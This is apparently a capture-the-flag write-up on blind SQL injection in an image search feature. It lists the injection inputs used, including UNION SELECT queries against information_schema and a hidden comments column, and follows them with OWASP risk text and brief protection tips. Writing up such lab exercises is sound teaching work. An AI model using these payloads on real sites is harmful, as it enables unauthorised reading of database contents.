# Blind SQL Injection in Image Search

# Tools
SQL injection: https://www.computersecuritystudent.com/SECURITY_TOOLS/SQL_INJECTION/lesson10/index.html
MD5 decoder, SHA256

# How to solve it
Started with a simple SQL injection to test if the input field returns any SQL
code by using:

```
5 AND 1=1
```

By using
```5 UNION SELECT table_name, column_name FROM information_schema.columns```
there can be found a column "comments", which is not shown in the original search.

So by making the SQL Injection:
```
5 UNION SELECT comment, title FROM list_images
```
the result shows the comment instead of the URL, in one of the comments are the instructions
to obtain the flag.

Risk Factors

The platform affected can be:

    Language: SQL
    Platform: Any (requires interaction with a SQL database)

SQL Injection has become a common issue with database-driven web sites. The flaw is easily detected, and easily exploited, and as such, any site or software package with even a minimal user base is likely to be subject to an attempted attack of this kind.

Essentially, the attack is accomplished by placing a meta character into data input to then place SQL commands in the control plane, which did not exist there before. This flaw depends on the fact that SQL makes no real distinction between the control and data planes.

# Source
https://owasp.org/www-community/attacks/Blind_SQL_Injection

### How to protect
 - Input Validation like restricting input size, and if the data is a name it doesnt have to contain numbers and if the data is a number we could block string from it.
 - Sanitize user input by checking some chars in the input and exchanging it so the SQL doesn't interpeter these.